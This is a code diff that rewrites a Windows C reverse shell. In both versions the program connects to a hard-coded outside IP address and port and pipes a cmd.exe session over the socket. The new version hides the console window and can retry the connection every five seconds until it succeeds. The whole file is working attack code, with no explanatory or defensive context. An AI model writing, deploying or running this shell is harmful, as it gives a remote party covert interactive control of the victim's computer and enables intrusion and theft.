@@ -1,41 +1,60 @@
 #include <winsock2.h>
+#include <windows.h>
+#include <io.h>
+#include <process.h>
+#include <sys/types.h>
 #include <stdio.h>
-#pragma comment(lib,"ws2_32")
+#include <stdlib.h>
+#include <string.h>
 
-WSADATA wsaData;
-SOCKET Winsock;
-struct sockaddr_in hax; 
-char ip_addr[16] = "141.148.192.43"; 
-char port[6] = "9999";            
+/* ================================================== */
+/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
+/* ================================================== */
+#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
+# define CLIENT_IP (char*)"141.148.192.43"
+# define CLIENT_PORT (int)9999
+#endif
+/* ================================================== */
 
-STARTUPINFO ini_processo;
+int main(void) {
+	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
+		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
+		return (1);
+	}
 
-PROCESS_INFORMATION processo_info;
+	WSADATA wsaData;
+	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
+		write(2, "[ERROR] WSASturtup failed.\n", 27);
+		return (1);
+	}
 
-int main()
-{
-		    WSAStartup(MAKEWORD(2, 2), &wsaData);
-			    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+	int port = CLIENT_PORT;
+	struct sockaddr_in sa;
+	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+	sa.sin_family = AF_INET;
+	sa.sin_port = htons(port);
+	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
 
+#ifdef WAIT_FOR_CLIENT
+	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+		Sleep(5000);
+	}
+#else
+	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
+		write(2, "[ERROR] connect failed.\n", 24);
+		return (1);
+	}
+#endif
 
-				    struct hostent *host; 
-					    host = gethostbyname(ip_addr);
-						    strcpy_s(ip_addr, inet_ntoa(*((struct in_addr *)host->h_addr)));
+	STARTUPINFO sinfo;
+	memset(&sinfo, 0, sizeof(sinfo));
+	sinfo.cb = sizeof(sinfo);
+	sinfo.dwFlags = (STARTF_USESTDHANDLES);
+	sinfo.hStdInput = (HANDLE)sockt;
+	sinfo.hStdOutput = (HANDLE)sockt;
+	sinfo.hStdError = (HANDLE)sockt;
+	PROCESS_INFORMATION pinfo;
+	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
 
-							    hax.sin_family = AF_INET;
-								    hax.sin_port = htons(atoi(port));
-									    hax.sin_addr.s_addr = inet_addr(ip_addr);
-
-										    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
-
-											    memset(&ini_processo, 0, sizeof(ini_processo));
-												    ini_processo.cb = sizeof(ini_processo);
-													    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
-														    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
-
-															    TCHAR cmd[255] = TEXT("cmd.exe");
-
-																    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
-
-																	    return 0;
+	return (0);
 }
